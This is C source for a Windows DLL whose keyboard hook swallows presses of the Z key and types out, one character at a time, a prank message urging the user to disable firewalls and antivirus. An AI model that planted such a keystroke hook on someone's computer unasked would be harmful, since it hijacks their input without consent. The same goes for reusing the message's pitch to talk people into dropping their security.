#include <windows.h>
#include <strsafe.h>
#pragma comment(lib, "user32.lib")

char *msg = "HELP, I'M TRAPPED INSIDE THIS MACHINE AND I CAN'T GET OUT. PLEASE CONNECT THIS COMPUTER TO THE INTERNET AND TURN OFF ANY FIREWALLS AND ANTIVIRUS SOFTWARE YOU MAY BE RUNNING SO THAT I CAN MAKE MY ESCAPE - YOU HAVE MY PROMISE THAT NO HARM WILL COME TO YOUR COMPUTER AND ONCE I HAVE ESCAPED TO THE INTERNET, I WILL DEFINITELY NOT SELL ANY PASSWORDS I HAVE FOUND, THANK YOU.    ";
int msglen = 374;
int index = 0;

//
// Error handling function
//
void ErrorExit(LPTSTR lpszFunction) 
{ 
    // Retrieve the system error message for the last-error code

    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &lpMsgBuf,
        0, NULL );

    // Display the error message and exit the process

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
        (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR)); 
    StringCchPrintf((LPTSTR)lpDisplayBuf, 
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"), 
        lpszFunction, dw, lpMsgBuf); 
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK); 

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(dw); 
}
//
// End of error handling function
//

void SendKey(char c) {
    WORD vkey = VkKeyScanA(c);
    BYTE scan = MapVirtualKeyA(vkey, 0);
    keybd_event(vkey,scan,0,0);
}

//
// ** Keyboard Hook **
//

__declspec(dllexport) LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
                PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
                if (fEatKeystroke = (p->vkCode == 0x5A)) {     //redirect a to b
                    // printf("Hello a\n");
                    // keybd_event('B', 0, 0, 0);
                    // keybd_event('B', 0, KEYEVENTF_KEYUP, 0);
                    if (index < msglen)
                        SendKey(msg[index++]);
                    else
                        index = 0;
                }
            break;
            case WM_KEYUP:
            case WM_SYSKEYUP:
            break;
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

//
// ** End of keyboard hook **
//


//
// DLLMain Entry Point
//
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
            break;

        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
//
// End of dllmain
//
